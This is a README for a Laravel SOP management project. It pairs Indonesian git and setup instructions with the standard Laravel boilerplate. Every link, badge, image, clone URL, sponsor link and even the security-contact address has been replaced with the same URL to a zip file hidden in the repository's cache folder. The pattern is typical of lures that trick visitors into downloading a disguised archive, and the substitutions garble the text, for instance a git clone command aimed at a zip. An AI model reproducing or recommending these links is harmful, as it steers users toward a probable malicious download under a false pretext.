<p align="center"><a href="https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip" target="_blank"><img src="https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip%20SVG/2%20CMYK/1%20Full%https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip" width="400" alt="Laravel Logo"></a></p>

<p align="center">
<a href="https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip"><img src="https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip" alt="Build Status"></a>
<a href="https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip"><img src="https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip" alt="Total Downloads"></a>
<a href="https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip"><img src="https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip" alt="Latest Stable Version"></a>
<a href="https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip"><img src="https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip" alt="License"></a>
</p>

## cara pake git + github 
Intall git (https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip).
cara clone: "git clone https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip"
kalo mau tambah fitur/update

1. pull (ambil update dari commit): "git pull"
2. bikin branch baru: "git branch nama-branch"
3. pindah branch: "git switch nama-branch"
4. code dan commit

cara commit:
1. "git add ."
2. "git commit -m "commit-message"'
3. "git push origin nama-branch"
4. ganti branch ke main, dan git pull

## Requirement sistem
Composer atau Laravel 10, yang di install dan bisa running di komputer kamu. Guide install laravel ada disini (https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip). PHP 8.1 keatas MySQL Local server untuk running database, Misalnya MAMP, Apache atau WAMP (XAMPP untuk Windows)

## Setup
1. karena code di repo ini tidak ada file .env dan folder "vendor", jadi kamu perlu generate file dan folder tersebut dengan bikin project baru di laravel. dengan perintah "laravel new nama-project-baru" atau jika pake composer "composer create-project laravel/laravel nama-project-baru"
3. clone repo ini ke lokal komputer kamu, kemudian copy file .env dan folder "vendor" ke folder tujuan repo.
4. Edit .env dan arahkan ke database yang ada dan running, pada lokal kita
5. buat database baru pada MySQL. kosongkan saja data dan table nya karena kita akan migrasi dari kode laravel
6. jalankan perintah 'composer install' untuk install requirement-requirement dari code di repo
7. jalankan perintah 'composer dump-autoload' untuk perbarui file file di "vendor"
8. jalankan 'php artisan migrate:refresh' untuk membuat tabel-tabel yang diperlukan kedalam database
9. apabila berhasil, kita bisa menjalankan 'php artisan migrate:status' akan terlihat tabel-tabel yang sudah diexpor kedalam database
10. jalankan 'php artisan serve' untuk menjalankan app
11. buka http://localhost:8000 (atau sesuakian dengan port di .env)
12. jika muncul website di localhost di browser, berarti setup sudah berhasil
    
## About Laravel

Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:

- [Simple, fast routing engine](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip).
- [Powerful dependency injection container](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip).
- Multiple back-ends for [session](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip) and [cache](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip) storage.
- Expressive, intuitive [database ORM](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip).
- Database agnostic [schema migrations](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip).
- [Robust background job processing](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip).
- [Real-time event broadcasting](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip).

Laravel is accessible, powerful, and provides tools required for large, robust applications.

## Learning Laravel

Laravel has the most extensive and thorough [documentation](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.

You may also try the [Laravel Bootcamp](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip), where you will be guided through building a modern Laravel application from scratch.

If you don't feel like reading, [Laracasts](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip) can help. Laracasts contains thousands of video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.

## Laravel Sponsors

We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the [Laravel Partners program](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip).

### Premium Partners

- **[Vehikl](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip)**
- **[Tighten Co.](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip)**
- **[WebReinvent](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip)**
- **[Kirschbaum Development Group](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip)**
- **[64 Robots](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip)**
- **[Curotec](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip)**
- **[Cyber-Duck](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip)**
- **[DevSquad](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip)**
- **[Jump24](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip)**
- **[Redberry](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip)**
- **[Active Logic](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip)**
- **[byte5](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip)**
- **[https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip)**

## Contributing

Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip).

## Code of Conduct

In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip).

## Security Vulnerabilities

If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip). All security vulnerabilities will be promptly addressed.

## License

The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/FredericoAkira/SOP_Management_System/main/storage/framework/cache/SOP_Management_System-v1.0.zip).
